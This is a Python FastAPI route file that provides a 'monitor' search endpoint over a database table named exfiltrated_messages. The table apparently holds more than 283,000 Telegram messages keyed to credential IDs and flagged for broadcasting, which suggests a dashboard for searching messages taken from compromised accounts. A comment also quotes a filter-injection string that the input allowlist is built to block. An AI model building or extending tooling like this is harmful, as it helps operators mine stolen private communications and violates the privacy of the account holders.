"""Monitor search resource routes."""

from .common import *

router = APIRouter()

@router.get("/search")
def search_messages(
    q: str,
    limit: int = 50,
    media_only: bool = False,
    since_hours: int | None = None,
):
    """Full-text search over exfiltrated_messages.content + sender_name.

    Uses pg_trgm GIN index (migration 20260803000010_message_fts.sql) for
    fast LIKE '%pattern%' queries at scale (283k+ messages).

    Params:
    - q: search term (case-insensitive substring match)
    - limit: max results (default 50, cap 500)
    - media_only: if True, only rows with media_type != 'text'
    - since_hours: filter to messages created in last N hours
    """
    if not q or len(q.strip()) < 2:
        raise HTTPException(status_code=400, detail="query must be at least 2 chars")

    # Whitelist: only allow alphanumeric + space + safe punctuation. This
    # blocks PostgREST metacharacters that could smuggle extra .or_() clauses
    # into the filter (e.g. ',is.null),content.eq.X('). Wildcards and quotes
    # explicitly rejected.
    import re as _re
    if not _re.fullmatch(r"[A-Za-z0-9 _.@\-]{2,80}", q.strip()):
        raise HTTPException(
            status_code=400,
            detail="query must match [A-Za-z0-9 _.@-]{2,80} — no wildcards, punctuation, or spaces at limits",
        )

    limit = min(max(limit, 1), 500)
    q_pattern = f"%{q.strip()}%"

    try:
        # PostgREST syntax: content=ilike.*bitcoin*
        query = (
            db.table("exfiltrated_messages")
            .select(
                "id, credential_id, telegram_msg_id, sender_name, content, "
                "media_type, is_broadcasted, created_at, broadcasted_at"
            )
            .or_(f"content.ilike.{q_pattern},sender_name.ilike.{q_pattern}")
            .order("created_at", desc=True)
            .limit(limit)
        )

        if media_only:
            query = query.neq("media_type", "text")

        if since_hours and since_hours > 0:
            from datetime import timedelta

            since = (datetime.now(UTC) - timedelta(hours=since_hours)).isoformat()
            query = query.gte("created_at", since)

        res = query.execute()
    except Exception as exc:
        logger.exception("monitor/search query failed")
        raise HTTPException(status_code=500, detail="Internal error") from exc

    matches = res.data or []
    return {
        "query": q,
        "match_count": len(matches),
        "limit": limit,
        "matches": matches,
    }
